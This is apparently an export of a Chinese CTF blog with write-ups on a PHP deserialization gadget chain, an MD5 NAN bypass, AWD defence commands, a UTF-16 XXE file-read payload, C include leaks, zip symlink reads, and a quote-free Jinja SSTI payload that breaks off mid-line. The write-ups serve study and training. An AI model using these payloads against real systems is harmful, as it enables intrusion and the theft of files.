<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>Mongo</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Mapper</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>Cursor</span> <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$legacy</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$collection</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$document</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$collection</span><span class="token punctuation">,</span><span class="token variable">$document</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">collection</span><span class="token operator">=</span><span class="token variable">$collection</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">document</span><span class="token operator">=</span><span class="token variable">$document</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>SQL</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Mapper</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>Cursor</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$props</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$props</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">props</span> <span class="token operator">=</span> <span class="token variable">$props</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>Jig</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Mapper</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span><span class="token punctuation">{</span>
    <span class="token variable">$SQLMapper</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>SQL<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$MongoMapper</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>Jig<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token variable">$SQLMapper</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$DBMongo</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>Mongo</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$MongoMapper</span><span class="token punctuation">,</span><span class="token string">"update"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$Agent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CLI<span class="token punctuation">\</span>Agent</span><span class="token punctuation">(</span><span class="token variable">$DBMongo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$WS</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CLI<span class="token punctuation">\</span>WS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$WS</span><span class="token punctuation">,</span><span class="token variable">$Agent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看了眼phpinfo，超级disable_function和open_basedir，想翻翻能不能翻出来什么奇怪的插件利用，结果突然翻到了flag，交了一下成了<br>这里明明__call函数使用的是call_user_func_array，但是实际上我试着传入两个参数的时候却一直报错只给了一个，不知道是怎么回事</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>想了一晚上没想出来，头都烂了</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">trick</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$trick1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$trick2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"你太长了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">!==</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>反序列化绕过md5，超级强md5判断，限制了长度的话就得是弱类型md5，问题就在于md5强类型相等后又需要trick弱类型不相等，并且两个trick中有一个会被强制类型转换为string，还有长度限制，太过分了</p>
<p>比赛结束之后师傅和我说他想出来了，不过说实话还是感觉有点有违常识<br>md5函数只接受字符串，接受数组时会返回false，接受数字时会将其转换为十进制数字的字符串进行运算，但是相同的数字和字符串在弱类型上是相同的，因此这种最基本的方法自然不行<br>但是PHP中存在一些奇怪的数字，也许它们并不是数字？<br>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN&#x3D;&#x3D;NAN都是false，通过这个性质，可以令trick1&#x3D;”NAN”，trick2&#x3D;NAN，完成判断取得flag<br>贴一个讲这个的链接<br><a href="https://blog.csdn.net/weixin_43257005/article/details/106118623">https://blog.csdn.net/weixin_43257005/article/details/106118623</a></p>
<p>如果昨天晚上就想出来就好了呜呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2020]总决赛</title>
    <url>/%5BCISCN2020%E6%80%BB%E5%86%B3%E8%B5%9B%5D.html</url>
    <content><![CDATA[<h1 id="CISCN2020-总决赛"><a href="#CISCN2020-总决赛" class="headerlink" title="[CISCN2020]总决赛"></a>[CISCN2020]总决赛</h1><p>国赛断网后战斗力趋近0，经常出现有的东西知道怎么回事但是想不起来还不能查的尴尬境地呜呜呜，被暴打<br>加上平台垃圾，体验极差</p>
<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p>易霖博的傻逼平台，具体有多垃圾不想说了，验证码AWD，验证码区分大小写，请分辨一下oOliIL1zZpPwWkK？一个flag交上去需要一分钟，交上去了之后给你一句图形验证码错误。15分钟一轮flag，平台崩了之后选手发呆一个下午到晚上七点散场，加固时间暂停时间挨打，师傅一个pwn好不容易出了准备割一波韭菜你直接把题变没了？莫名其妙突然环境被重置又挨打，最后成绩第二天投票决定百分比，还有七个队虚空上分直接进入前30，断网断网有的师傅还是开着热点，聊QQ翻博客的都有，战斗力正无穷<br>真有你的啊易霖博，不多说了知乎见</p>
<p>还是记录一下最近打awd的心得，毕竟awd打的还是比较少，毕竟我是个菜逼（主要还是被没网打怕了，有网我不能临时查？）</p>
<h3 id="防范不死马"><a href="#防范不死马" class="headerlink" title="防范不死马"></a>防范不死马</h3><p>易霖博平台出问题的时候虚空挨打，休息结束发现被中了不死马，真有你的<br>防范不死马，用如下命令杀全部进程，防止不死马复制，也可以写成一个PHP文件，访问一次就杀全部。因为不是root权限，所以不会把Apache主进程杀掉，不会有大问题<br>杀的方式和PHP服务类型也有区别，php-apache或者php-fpm的用户名不一样</p>
<pre><code>#pfp-fpm 条件下 
kill `ps -ef | grep php-fpm | grep -v grep | grep &#39;www&#39; | awk &#39;&#123;print $1&#125;&#39;`

# apache
#httpd
kill `ps -ef | grep httpd | grep -v grep | grep &#39;www&#39; | awk &#39;&#123;print $1&#125;&#39;`

#apache2
kill `ps -ef | grep apache | grep -v grep | grep &#39;www&#39;| awk &#39;&#123;print $2&#125;&#39;`
</code></pre>
<p><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a></p>
<h3 id="挂载流量审计脚本"><a href="#挂载流量审计脚本" class="headerlink" title="挂载流量审计脚本"></a>挂载流量审计脚本</h3><p>之前都是用一个python脚本递归搜索挂载，结果这次awd没有python，导致一开始被打了好多下还不知道哪挨打<br>后来说准备一个PHP的load脚本，不过后来师傅们说这种大型框架，就在一个config之类的被引用的多的地方include_once一下，这样子基本上就能护住绝大多数文件了<br>递归挂载可能直接导致环境崩溃，使用了namespace的PHP可能会出现大问题<br>所以还是稍微手动搞一下<br>这里提一嘴，易霖博毫无check，有的师傅感觉把页面都删的差不多了，还有无数个无敌通防，绝对防御，就很赖皮</p>
<h3 id="查看最新更新文件"><a href="#查看最新更新文件" class="headerlink" title="查看最新更新文件"></a>查看最新更新文件</h3><p>可能是我打的awd的质量都不高，感觉web除了几个垃圾洞以外，剩下的都是cms的奇怪poc或者是0day了，那么除了使用seay和D盾之类的来扫弱智洞以外，主办方可能稍微添加一些比较隐晦的洞。这个时候直接查看文件修改时间，拉下来的模板都是很老的，但是主办方要修改加洞的话必然会修改这个时间。就可以靠这个快速发现漏洞<br>打的时候没网，现在记一下，也不知道能不能用</p>
<p>当前目录24小时内修改的PHP文件<br><code>find . -name &#39;*.php&#39; -mtime 0</code><br>当前目录查找最近30分钟修改的当前目录下的.php文件<br><code>find . -name &#39;*.php&#39; -mmin -30</code><br>当前目录一天前修改过的文件<br><code>find . -type f -mtime +1</code><br>当前目录一天内修改的文件<br><code>find . -type f -mtime -1</code></p>
<h3 id="修题nohup"><a href="#修题nohup" class="headerlink" title="修题nohup"></a>修题nohup</h3><p>PHP改了就能用，很方便，但是python和nodejs就不太行，需要重新起一个服务，然而我们kill -9杀了服务后，我们重启的服务在我们退出了中断之后也就没了，因此，我们需要强力的nohup指令帮我们在后台运行指令，改完跑路了服务也不会挂<br><code>nohup COMMAND &gt; nohup.out 2&gt;&amp;1 &amp;</code> 将标准错误重定向到标准输出，再把标准输出重定向到out文件中<br>nohup之后好像需要exit退出终端，今天直接关了终端好像服务就没了，还懵逼了一会<br>就可以了（嗯<br>nodeJS重启服务是需要node &#x2F;app&#x2F;app.js这个样子，也可以用grep看看是啥，总之今天差点忘了导致自己翻车</p>
<h3 id="Linux看开端口"><a href="#Linux看开端口" class="headerlink" title="Linux看开端口"></a>Linux看开端口</h3><p>好像没什么用但是还是记一下，还是完全不会用Linux呢<br><code>netstat -ptuan</code></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas</title>
    <url>/%5BCSAWQual%20%5DWeb_Unagi&amp;%5BFireshellCTF%5DCaas.html</url>
    <content><![CDATA[<h1 id="CSAWQual-Web-Unagi-amp-FireshellCTF-Caas"><a href="#CSAWQual-Web-Unagi-amp-FireshellCTF-Caas" class="headerlink" title="[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas"></a>[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas</h1><p>两个BUU一分题，不难但也不算太简单</p>
<h2 id="Web-Unagi"><a href="#Web-Unagi" class="headerlink" title="Web_Unagi"></a>Web_Unagi</h2><p>题目就是个很明显的XXE，传一个XML文件上去，ban了ENTITY，SYSTEM，file之类的关键字</p>
<p>使用UTF16编码绕过，编码之后这种字符串匹配的waf就根本拦不住我们了，直接读文件就行</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-16"?></span>
<span class="token doctype">&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY ></span>
&lt;!ENTITY aa SYSTEM "file:///flag" >]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>aa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity" title="&aa;">&amp;aa;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span>
</code></pre>
<p>这里主要是记录一下XXE之类的东西，这个题倒是没什么太多可记录的东西</p>
<h3 id="UTF-8-amp-amp-UTF-16"><a href="#UTF-8-amp-amp-UTF-16" class="headerlink" title="UTF-8 &amp;&amp; UTF-16"></a>UTF-8 &amp;&amp; UTF-16</h3><p>UTF-8是无敌常见的编码类型，用变长字节指定一个字符，对于ASCII码就是正常的一个字节，其他字符可能用两个或者三个字节表示。UTF-16就固定的用两个字节表示一个字符，对于ASCII码也得使用两个字节，所以每个ASCII码前面也得加一个\x00空字符进去<br>写了个python脚本逐字符的加\x00进去的不能用。。。不知道是python在read的时候缺了啥还是windows和Linux上换行CLRF之类的区别的问题</p>
<p>插入了一个空字符这种字符串匹配的检测就根本无法拦截我们，编码在xml第一行的定义里写上即可，整个文件都需要进行编码<br>用这个命令可以直接进行编码转换<code>cat a.xml | iconv -f UTF-8 -t UTF-16BE &gt; payload.xml</code><br>BE指的是big endian，对应的还有LE little endian，就是大小端序</p>
<p>有一种说法是直接看文件开头几个字符就能直接确定文件的类型。比如UTF-8是<code>EF BB BF</code>而UTF-16BE是<code>FF FE</code>，但是我010editor打开之后并没有看到这些字节。。</p>
<h3 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h3><p>XXE可以说是SSRF的一种特化？最常见的攻击方式就是用file:&#x2F;&#x2F;协议之类的进行文件读取了，读<code>/etc/network/interfaces /proc/net/arp /etc/host</code>这几个文件进行内网探测之类的，不过不能解析的数据同样可以用CDATA拼一下转义掉再外带。也可以发http协议进行ssrf，端口探测。在PHP中支持PHP伪协议，在安装了expect扩展时可以利用其进行RCE，在java中可以使用jar协议文件上传。</p>
<h2 id="FireshellCTF-Caas"><a href="#FireshellCTF-Caas" class="headerlink" title="[FireshellCTF]Caas"></a>[FireshellCTF]Caas</h2><p>很奇怪的题目，写一个C代码，然后编译完了返回一个二进制文件，不符合语法会报错。<br>从报错中大概可以猜出来后端逻辑是把输入写入&#x2F;tmp下一个随机文件名的.c文件，然后gcc编译，编译成功就返回二进制文件，失败就返回报错，看起来整个流程非常的安全，写入文件名不可控，写入文件后缀固定为.c，gcc编译可能用的命令执行但是文件名完全不可控，也没有利用点了<br>一开始在想有没有命令注入，可能是echo进去的文件之类的（不太现实）。测了一下发现不行。看wp</p>
<p>直接使用了C的#include语句进行了文件包含。。。这我真没想到，好久没写C都忘了这茬了。利用的是报错的外带，因为flag文件肯定不符合C语法，在编译的时候include进来，这里就必然引发一个错误，而报错的点就是引发错误的flag文件，自然就把文件内容外带了<br>这种利用想法还真令人眼前一亮，完全没想到，学习了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/kingcat/archive/2012/10/16/2726334.html">Unicode(UTF-8, UTF-16)令人混淆的概念</a><br><a href="https://www.anquanke.com/post/id/170655">XXE Bypass WAF</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2021]决赛</title>
    <url>/%5BCISCN2021%5D%E5%86%B3%E8%B5%9B.html</url>
    <content><![CDATA[<h1 id="CISCN2021-决赛"><a href="#CISCN2021-决赛" class="headerlink" title="[CISCN2021]决赛"></a>[CISCN2021]决赛</h1><p>居然混到了国一，队友牛逼！可信计算牛逼！</p>
<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p>经典awd坐牢，对tp等大型PHP框架的审计一无所知的我只能坐牢，官方流量要延迟一小时，意味着awd只会上车的我被乱杀，一度被打到倒数前十。但其实web也能自力更生的抓流量，但这回因为未知的原因，祖传脚本未能抓到流量，经过长达一个小时的边挨打边修边研究，发现是祖传脚本默认把流量写入tmp目录，而不知为何tmp目录不能写造成的。<br>查看phpinfo，disable_fucntion禁用了system，exec等命令执行函数，让写入不死马的几率降低到最小，open_basedir并没有值，那么应该不会影响到写入tmp，查看tmp权限，经典777+t，那么也不会影响写入。最后，为什么写不了tmp成为了一个永远的未解之谜。<br>然后挨了一个小时打之后发现流量能写本地，然后就开始上车，但这个时候的垃圾洞已经被修的差不多了，捡垃圾也只能捡一点点分，成功进入倒数前十。</p>
<p>还是记录一下踩的坑吧。</p>
<h3 id="祖传抓流量脚本不能用"><a href="#祖传抓流量脚本不能用" class="headerlink" title="祖传抓流量脚本不能用"></a>祖传抓流量脚本不能用</h3><p>就是刚才说的祖传waf因为不知名原因无法写tmp，但可以写当前目录下，改了一下又能勉勉强强的跑起来。但是写当前目录不知道是就直接填个<code>.</code>呢还是填个<code>/var/www/html/</code>比较保险呢？填个<code>.</code>不需要额外思考，但是只对tp这种单页入口的好用，如果是那种每个文件都是入口的简单PHP文件堆，还得批量挂载，并且每个文件的执行目录不一样，就会导致日志写的到处都是？但是我不清楚这回写不了tmp但是能写当前目录是什么原因，不知道填了绝对路径会不会出问题？</p>
<h3 id="改密码！！！"><a href="#改密码！！！" class="headerlink" title="改密码！！！"></a>改密码！！！</h3><p>如果感觉ssh密码有点毛病，就把ssh密码也给改了，免得收到ssh攻击。。。。<br>一定要翻一翻配置文件找数据库密码和后台管理员密码！迅速改掉跑路，很多洞都是来自于直接登录你管理员后台，改模板上传马关站之类的，分区赛也是被登了后台，一次是关了站，一次是改了模板，直接把我flag放到首页了。。这次也一样，被登录了后台然后被疯狂传马，还有一个站是登录后台然后改我模板，主页变空白后check不过，也是挨打。这种情况还可能会遇到主机上没有mysql客户端，没法终端改数据库密码，那就只能从网站代码找接口，但是有时候网站管理员密码也找不到，就在配置文件里找到一个mysql密码，但是又连不上，急死<br>所以这次学会了一个新把戏，adminer.php，这个玩意单个文件就包含了完整的数据库管理功能，小phpmyadmin</p>
<h3 id="准备二进制工具"><a href="#准备二进制工具" class="headerlink" title="准备二进制工具"></a>准备二进制工具</h3><p>python脚本固然好用，可是，万一目标机器没有python环境呢？当场暴毙是完全可能的，所以成熟的赛棍都会使用强力的pyinstaller把脚本和解释器第三方库全部超级打包到二进制，这样就能随便跑了，把我也本地整一个，到时候要python脚本的时候就能打包<br>不过这里注意pyinstaller并不能跨平台，所以应该在虚拟机上打一个包，然后才能在Linux目标机器上运行</p>
<h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h3><p>可信计算牛逼！！！<br>没这个可信计算今年就人生有梦各自精彩了。题目并不难，总的来说就是看懂代码在干什么，然后填空，初看觉得完全看不懂，但是大概看懂情况之后就能做出来了，并且有很贴心的注释，整体代码不是很复杂，并且大部分函数都已经实现了，只需要对着要求去找函数复制粘贴一下就能搞定，每个题的工作量可能只有十行不到的代码。一个小时狂砍3w分完成翻盘</p>
<h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>ctf，先打再修，经典赛制<br>四个web看了两个一个没出嘻嘻</p>
<p>buu上了国赛复现，所以又再补充一点</p>
<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>有一个上传功能，然后写着你是admin就会告诉你写什么东西，cookie看起来像是jwt那类的，把第一段base64解码一下，username guest。需要伪造cookie，验证了一下是flask那种的cookie，所以一个可能性是爆破密钥，但是没有工具，让队友去下，没找到这种爆破工具，试一试上传点。这种上传一般来说都给传图片，先传个png试试。502bad gateway？不会，告辞</p>
<p>赛后ssh上去看了一眼，发现是能传zip，第一反应是以前见过的一个传zip软链接进行任意文件读取，估计是考的这个点，但是那个时候的我还没意识到问题的严重性<br>直到队友在pyc里面看到了hctf字样，我才知道这铁原题，搜了一下，zip传软链接任意文件读取就是hctf2018里面的原题，我知道有软链接任意读这么一回事，但我并没有去看那个原题，上网机一搜，好家伙，除了题目名字一个字没改，铁原题。</p>
<p>修复方案，比较合理的方案是检查解压缩之后是不是有软链接，不读取软链接，但是比赛时不方便查东西，并不知道怎么实现，由于题目最后伪造admin session靠的是伪造密钥，而密钥是由Mac地址为种子产生的随机数，因此通过读Mac地址打通的，这里把随机数改成个其他的uuid之类的定值就行了</p>
<p>用zip保留软链接的打包需要添加一个<code>-y</code>参数</p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>一个登陆界面，随便测一下，测半天没反应，回显一直是404，没找到注入点，然后随便换了个路由，看看能不能注册，结果发现改了之后，原来tab上的login not found变成了register not found，不会是这里ssti吧。<br>测了一下还真是。。。只能说略微的有点诡异，简单试了一下发现过滤了数字和join，并且只在双大括号内过滤。试了一下引号，直接500，我一度以为应该是我的语法有问题，但实际上我也不知道怎么回事，最后就权当他过滤了引号吧。那么就大概是过滤了数字和引号的ssti，把以前的payload翻出来改改</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20pc<span class="token operator">=</span>g<span class="token operator">|</span>lower<span class="token operator">|</span>list<span class="token operator">|</span>first<span class="token operator">|</span>urlencode<span class="token operator">|</span>first<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20c</span><span class="token operator">=</span>g<span class="token operator">|</span>lower<span class="token operator">|</span>list<span class="token operator">|</span>first<span class="token operator">|</span>urlencode<span class="token operator">|</span>last<span class="token operator">|</span>lower<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20zero<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">-</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20one<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">-</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20two<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20three<span class="token operator">=</span>two<span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20four<span class="token operator">=</span>three<span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20five<span class="token operator">=</span>four<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20six<span class="token operator">=</span>five<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20seven<span class="token operator">=</span>six<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20eight<span class="token operator">=</span>seven<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20nine<span class="token operator">=</span>eight<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20udl<span class="token operator">=</span><span class="token punctuation">(</span>pc<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20xhx<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token 